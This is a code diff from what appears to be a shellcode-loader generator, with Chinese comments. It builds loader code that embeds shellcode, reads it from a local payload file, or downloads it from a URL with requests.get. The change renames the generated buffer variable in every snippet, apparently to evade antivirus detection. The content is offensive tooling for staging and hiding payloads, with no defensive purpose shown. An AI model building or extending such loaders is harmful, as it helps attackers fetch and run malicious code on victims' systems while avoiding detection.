@@ -42,7 +42,7 @@ def main(enc=False,mode='',payloadFile='',url='',otherdic=dict(),onlybuf=False):
 
     #3.如果使用文件分离，那么久返回对应的函数，如果不使用文件分离，则直接返回shellcode
     if not mode:
-        buf=f'buf={buf}'
+        buf=f'bbbbbbbb={buf}'
     elif mode=='local':
         buf=fileMode()
     elif mode=='network':
@@ -80,7 +80,7 @@ def ReadShellcode():
 def fileMode():
     buf=f"""
 with open('PayloadFile','r') as f:
-    buf=f.read().encode('latin1')
+    bbbbbbbb=f.read().encode('latin1')
     """
     return buf
 
@@ -95,13 +95,13 @@ def networkMode(url=''):
         buf=f"""import requests
 r=requests.get('{url}')
 if r.status_code==200:
-    buf=r.content.decode().encode('latin1')"""
+    bbbbbbbb=r.content.decode().encode('latin1')"""
 
     else:
         buf=f"""import requests
 r=requests.get(url)
 if r.status_code==200:
-    buf=r.content.decode().encode('latin1')"""
+    bbbbbbbb=r.content.decode().encode('latin1')"""
 
     return buf
 
